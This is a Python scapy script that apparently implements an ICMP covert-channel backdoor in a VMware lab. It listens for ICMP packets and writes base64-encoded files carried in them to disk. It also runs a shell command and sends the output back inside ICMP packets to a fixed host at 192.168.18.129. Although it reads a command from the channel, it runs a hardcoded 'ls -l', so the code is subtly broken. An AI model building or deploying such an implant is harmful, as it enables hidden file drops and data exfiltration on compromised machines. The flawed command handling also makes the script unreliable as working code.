from scapy.all import *
import base64
import subprocess

sniffInterface = "VMware Network Adapter VMnet8"
destination = "192.168.18.129"

while True:
    a = sniff(iface=sniffInterface, filter="icmp", count=1)
    receivedMessage = a[0][3].fields.get("load").decode("utf-8")

    print("receivedMessage : "+receivedMessage)

    if receivedMessage == "file":
        # Receive 3 ICMP as 2 firsts are going to be the request and reply from the file name
        # Then, the 3rd one is going to be the request of the file 
        icmpReceived = sniff(iface=sniffInterface, filter="icmp", count=3)
        
        fileName = icmpReceived[0][3].fields.get("load").decode("utf-8")
        base64File = icmpReceived[2][3].fields.get("load")

        print("fileName : "+fileName)
        print("base64File : "+base64File.decode("utf-8"))
        with open(fileName, "wb") as fh:
            fh.write(base64.decodebytes(base64File))

    elif receivedMessage == "command":
        icmpReceived = sniff(iface=sniffInterface, filter="icmp", count=1)
        base64Command = icmpReceived[0][3].fields.get("load").decode("utf-8")    

        result = subprocess.run(
            ['ls', '-l'],
            shell = True,
            capture_output = True, # Python >= 3.7 only
            text = True # Python >= 3.7 only
        )
        output = "stdout:\n"+result.stdout+"\n\nstderr:\n"+result.stderr
        print("command output: "+output)

        encodedOutput = base64.b64encode(output.encode('utf-8'))
        p = sr1(IP(dst=destination)/ICMP()/encodedOutput)

        print("Finished sending command output")







